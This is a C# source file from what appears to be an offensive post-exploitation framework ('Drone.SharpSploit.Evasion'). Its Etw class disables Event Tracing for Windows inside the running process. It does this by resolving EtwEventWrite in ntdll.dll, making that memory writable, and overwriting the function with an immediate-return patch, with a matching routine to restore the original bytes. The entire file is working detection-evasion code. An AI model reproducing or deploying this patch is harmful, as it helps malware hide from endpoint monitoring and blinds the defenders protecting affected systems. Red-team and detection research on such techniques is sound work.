using System;
using System.Runtime.InteropServices;

namespace Drone.SharpSploit.Evasion
{
    public class Etw
    {
        // Slightly modified version of the AMSI evasion module
        private IntPtr _address;
        private byte[] _original;

        public void Patch()
        {
            _address = DInvoke.DynamicInvoke.Generic.GetLibraryAddress(
                "ntdll.dll",
                "EtwEventWrite",
                true);

            var pathBytes = Utilities.IsProcess64Bit ? X64Patch : X86Patch;

            _original = new byte[pathBytes.Length];

            Marshal.Copy(_address, _original, 0, pathBytes.Length);

            var size = (IntPtr)pathBytes.Length;

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr)(-1),
                ref _address,
                ref size,
                 DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);

            Marshal.Copy(pathBytes, 0, _address, pathBytes.Length);

            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr)(-1),
                ref _address,
                ref size,
                oldProtect);
        }

        public void Restore()
        {
            var size = (IntPtr)_original.Length;

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr)(-1),
                ref _address,
                ref size,
                DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);

            Marshal.Copy(_original, 0, _address, _original.Length);

            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr)(-1),
                ref _address,
                ref size,
                oldProtect);
        }

        private static byte[] X64Patch
        {
            get
            {
                var patch = new byte[2];
                
                patch[0] = 0xc3;
                patch[1] = 0x00;

                return patch;
            }
        }

        private static byte[] X86Patch
        {
            get
            {
                var patch = new byte[3];
                
                patch[0] = 0xc2;
                patch[1] = 0x14;
                patch[2] = 0x00;
                
                return patch;
            }
        }
    }
}